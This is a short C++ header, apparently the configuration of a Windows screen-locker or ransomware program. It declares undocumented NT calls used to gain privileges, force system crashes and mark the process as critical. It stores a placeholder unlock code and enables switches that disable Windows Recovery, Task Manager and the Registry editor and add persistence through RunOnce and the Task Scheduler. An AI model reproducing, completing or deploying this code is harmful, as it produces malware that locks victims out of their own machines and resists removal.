#include <io.h>
#include <codecvt>
#include <fstream>
#include <comdef.h>
#include <SEH/SEH.h>
#include <taskschd.h>
#include <filesystem>
#include <ShlObj_core.h>

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN bEnablePrivilege, BOOLEAN IsThreadPrivilege, PBOOLEAN PreviousValue);
EXTERN_C NTSTATUS NTAPI	NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
EXTERN_C NTSTATUS NTSYSAPI RtlSetProcessIsCritical(BOOLEAN bNew, BOOLEAN* pbOld, BOOLEAN bNeedScb);

inline const std::wstring uninstallCode(REPLACE_ME);

/**********
 Monitored
**********/

#define DisableWinRE
#define DisableTaskMGR
#define DisableRegistry
#define RunOnceRegistry
#define TaskSchedulerStartup

/************
 Unmonitored
************/

//#define StartupFile //WARNING: codecvt_utf8_utf16 is deprecated